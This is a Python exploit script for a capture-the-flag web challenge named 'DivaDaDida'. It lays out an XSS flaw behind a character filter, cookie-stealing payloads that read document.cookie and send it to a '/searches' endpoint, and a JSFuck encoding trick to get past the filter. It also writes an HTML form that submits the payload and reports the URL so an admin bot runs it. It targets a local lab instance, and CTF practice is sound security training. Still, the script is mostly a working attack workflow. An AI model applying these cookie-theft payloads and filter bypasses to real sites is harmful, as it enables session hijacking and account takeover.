#!/usr/bin/env python3
"""
DivaDaDida CTF Challenge Exploit
Generates JSFuck payload to steal admin's cookie
"""

def generate_jsfuck_payload():
    """
    Generate JSFuck payload that steals the cookie
    Target: document.cookie exfiltration
    
    The filter blocks most characters EXCEPT: c, i, o, C, I, O, +
    Plus JSFuck characters: []()!+
    """
    
    # Full JSFuck can be generated using online tools
    # For this challenge, we need to encode:
    # fetch('/searches?c='+document.cookie)
    # OR
    # location='/?c='+document.cookie
    
    # Since manual JSFuck is extremely long, here's the strategy:
    print("=" * 60)
    print("DivaDaDida CTF Exploit Generator")
    print("=" * 60)
    print()
    print("VULNERABILITY ANALYSIS:")
    print("-" * 60)
    print("1. XSS via unescaped template rendering: <%- _ %>")
    print("2. Character filter has gaps: allows c, i, o, C, I, O")
    print("3. Plus sign (+) is NOT in the blocked list!")
    print("4. Flag is stored in non-httpOnly cookie")
    print("5. Admin bot visits reported URLs")
    print()
    
    print("ALLOWED CHARACTERS:")
    print("-" * 60)
    print("Letters: c, i, o (and uppercase C, I, O)")
    print("JSFuck chars: [ ] ( ) ! +")
    print()
    
    print("EXPLOIT STRATEGY:")
    print("-" * 60)
    print("1. Use JSFuck to encode JavaScript")
    print("2. Payload exfiltrates document.cookie")
    print("3. Submit as '_' parameter in /search")
    print("4. Report URL to admin")
    print("5. Admin executes XSS, cookie leaked")
    print()
    
    # Simplified payload for demonstration
    # In reality, you'd use a JSFuck encoder
    payload_js = "location='/searches?c='+document.cookie"
    
    print("TARGET JAVASCRIPT:")
    print("-" * 60)
    print(payload_js)
    print()
    
    print("MANUAL EXPLOITATION STEPS:")
    print("-" * 60)
    print("1. Go to https://jsfuck.com/")
    print(f"2. Encode: {payload_js}")
    print("3. Visit challenge URL: http://localhost:3000/")
    print("4. Submit POST to /search:")
    print("   - q: test")
    print("   - _: <JSFuck_encoded_payload>")
    print("5. Note the UUID in redirect URL")
    print("6. Submit to /report:")
    print("   - url: http://localhost:3000/search/<UUID>")
    print("7. Admin visits and executes XSS")
    print("8. Check /searches for cookie data")
    print()
    
    print("ALTERNATIVE: Simpler Character Set Exploitation")
    print("-" * 60)
    print("Since we have access to 'c', 'i', 'o', we might be able to")
    print("construct primitives without full JSFuck.")
    print()
    
    # Example of what JSFuck looks like (abbreviated)
    example_jsfuck = "[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[+[]]]"
    print("JSFuck EXAMPLE (abbreviated):")
    print(example_jsfuck)
    print()
    
    print("NOTES:")
    print("-" * 60)
    print("- CSP blocks external resources but allows inline scripts")
    print("- The script tag has id=<query> which could be used")
    print("- Consider using both 'q' and '_' parameters cleverly")
    print()

def create_exploit_html():
    """Create an HTML file to test the exploit locally"""
    html_content = """<!DOCTYPE html>
<html>
<head>
    <title>DivaDaDida Exploit</title>
</head>
<body>
    <h1>DivaDaDida Exploit Form</h1>
    
    <h2>Step 1: Submit Search with Payload</h2>
    <form action="http://localhost:3000/search" method="POST" target="_blank">
        <label>Query (q):</label><br>
        <input type="text" name="q" value="test" style="width: 400px;"><br><br>
        
        <label>Payload (_) - Paste JSFuck here:</label><br>
        <textarea name="_" rows="10" cols="50" placeholder="Paste JSFuck encoded payload here"></textarea><br><br>
        
        <button type="submit">Submit Search</button>
    </form>
    
    <hr>
    
    <h2>Step 2: Report URL to Admin</h2>
    <form action="http://localhost:3000/report" method="POST" target="_blank">
        <label>URL:</label><br>
        <input type="text" name="url" value="http://localhost:3000/search/" style="width: 400px;" 
               placeholder="http://localhost:3000/search/<UUID>"><br><br>
        
        <button type="submit">Report to Admin</button>
    </form>
    
    <hr>
    
    <h2>Step 3: Check Results</h2>
    <p><a href="http://localhost:3000/searches" target="_blank">View all searches</a></p>
    
    <hr>
    
    <h2>Resources</h2>
    <ul>
        <li><a href="https://jsfuck.com/" target="_blank">JSFuck Encoder</a></li>
        <li>Target payload: <code>location='/searches?c='+document.cookie</code></li>
        <li>Or: <code>fetch('/searches?c='+document.cookie)</code></li>
    </ul>
</body>
</html>"""
    
    with open(r"c:\Users\haryp\Downloads\web diva\exploit.html", "w") as f:
        f.write(html_content)
    
    print("Created exploit.html for testing")
    print()

if __name__ == "__main__":
    generate_jsfuck_payload()
    create_exploit_html()
    
    print("=" * 60)
    print("NEXT STEPS:")
    print("=" * 60)
    print("1. Open exploit.html in browser")
    print("2. Use https://jsfuck.com to encode your payload")
    print("3. Follow the steps in the HTML form")
    print("4. Retrieve flag from /searches endpoint")
    print("=" * 60)
